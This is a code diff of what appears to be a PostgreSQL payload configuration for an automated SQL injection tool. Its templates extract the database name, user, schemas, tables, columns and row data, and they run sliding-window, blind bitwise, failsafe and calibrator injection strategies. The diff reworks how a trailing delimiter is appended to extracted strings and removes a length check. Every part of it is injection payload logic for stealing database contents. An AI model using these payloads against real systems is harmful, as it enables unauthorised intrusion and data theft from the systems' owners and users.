@@ -14,7 +14,6 @@ resource:
   || current_database()
   || '${enclose_value_sql}'
   || user
-  || '${trail_sql}'
 
  schema:
   database: |
@@ -39,7 +38,6 @@ resource:
            ),
            '${separator_cell_sql}'
        )
-       || '${trail_sql}'
 
   table: |
    select
@@ -63,7 +61,6 @@ resource:
            ),
            '${separator_cell_sql}'
        )
-       || '${trail_sql}'
 
   column: |
    select
@@ -88,7 +85,6 @@ resource:
            ),
            '${separator_cell_sql}'
        )
-       || '${trail_sql}'
 
   row:
    query: |
@@ -112,7 +108,6 @@ resource:
             ),
             '${separator_cell_sql}'
         )
-        || '${trail_sql}'
    fields:
     field: trim(coalesce(${field.value}::text, ''))
     concat: "|| '%7f' ||"
@@ -121,17 +116,18 @@ strategy:
  configuration:
   slidingWindow: |
    select
-       /* If reach end of string (${lead}i) then NULLIF nullifies the result.
-          TODO Prevent parsing the query displayed on error message with split ${lead} (similar to 0+1) */
+       /* Coalesce appends trail when end of string (${lead}${trail}).
+          TODO Cleaner lead (similar to 0+1) */
        'Sq' || 'Li'
-       || nullif(
+       || coalesce(
            substr(
                (${injection}),
                ${window.char},
                65536
            ),
-           '${trail_sql}'
+           ''
        )
+       || '${trail_sql}'
   limit: limit 65536 offset ${limit.value}
   failsafe: (1337${indice}7330%2b1)::text
   calibrator: repeat(chr(35), 1024)
@@ -174,7 +170,6 @@ strategy:
         )
         %26 ${bit}
     )
-   length: char_length((${injection})) > ${window.char}
   modeAnd: and
   modeOr: or
   blind: ${boolean.mode} ${test}
